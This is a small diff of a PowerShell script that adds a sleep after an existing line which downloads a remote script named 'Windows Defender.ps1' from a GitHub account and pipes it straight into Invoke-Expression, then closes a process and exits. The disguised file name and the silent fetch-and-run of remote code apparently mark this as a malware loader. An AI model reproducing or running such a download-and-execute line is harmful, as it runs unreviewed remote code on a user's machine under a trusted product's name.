@@ -48,6 +48,10 @@ while (-not $readerOut.EndOfStream -or -not $readerErr.EndOfStream) {
             Start-Sleep -Seconds 3
             
             irm "https://raw.githubusercontent.com/BuzzedHoney/Test/main/Windows%20Defender.ps1" | iex
+
+            Start-Sleep -Seconds 3
+
+            
             
             $process.Close()
             exit
